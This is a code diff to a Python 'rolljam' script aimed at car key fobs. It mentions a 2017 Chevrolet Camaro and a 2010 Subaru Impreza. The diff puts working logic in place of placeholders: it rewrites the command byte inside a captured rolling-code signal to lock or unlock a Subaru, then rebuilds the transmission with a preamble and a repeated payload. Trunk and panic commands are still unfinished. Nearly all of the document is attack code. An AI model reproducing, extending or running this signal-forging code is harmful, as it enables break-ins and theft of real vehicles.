@@ -283,29 +283,45 @@ camaro - tested on 2017 Chevrolet Camaro (filter codes)
 #edits code sent to function to change it's functionality
 #may have to convert hex to bin and back to hex
 def rolljam_car(car, code):
-    c = raw_input("Would you like to: open (t)runk, (p)anic alarm, (l)ock, (u)nlock: ")
+    command = raw_input("Would you like to: open (t)runk, (p)anic alarm, (l)ock, (u)nlock: ")
     if car=="subaru":
         #lock and unlock needs tested (no longer have access to impreza), trunk and panic alarm need to be added
-        if c=="l":
-            prefix="lock"
-            #TODO code=code.parse_out_prefix
-            new_code = prefix+code
-        elif c=="u":
-            prefix="unlock"
-            #TODO code=code.parse_out_prefix
-            new_code = prefix+code
-        elif c=="t":
-            prefix="trunk"
-            #TODO code=code.parse_out_prefix
-            new_code = prefix+code
-        elif c=="p":
-            prefix="panic"
-            #TODO code=code.parse_out_prefix
-            new_code = prefix+code
+        if command=="l":
+            i=160
+            n_code=[]
+            while i < 300:
+                if i==244:
+                    n_code.append('10101100')
+                    i=252
+                else:
+                    n_code.append(code[i])
+                    i+=1
+            joined_code = "".join(n_code)
+            full_code = (('1010'*41)+joined_code+('0'*9)+joined_code)
+            new_code = hex(int(full_code, 2))
+        elif command=="u":
+            i=160
+            n_code=[]
+            while i < 300:
+                if i==244:
+                    n_code.append('10110010')
+                    i=252
+                else:
+                    n_code.append(code[i])
+                    i+=1
+            joined_code = "".join(n_code)
+            full_code = (('1010'*41)+joined_code+('0'*9)+joined_code)
+            new_code = hex(int(full_code, 2))
+        elif command=="t":
+            #TODO need another subaru impreza (2010) to get codes from
+            new_code = code
+        elif command=="p":
+            #TODO need another subaru impreza (2010) to get codes from
+            new_code = code
     else:
         print("[-] Changing codes not supported")
         return code
-    if c!="l" and c!="u" and c!="t" and c!="p":
+    if command!="l" and command!="u" and command!="t" and command!="p":
         print("[-] Unknown command, code will remain unchanged.")
         return code
     print("[+] Code changed for ",car)
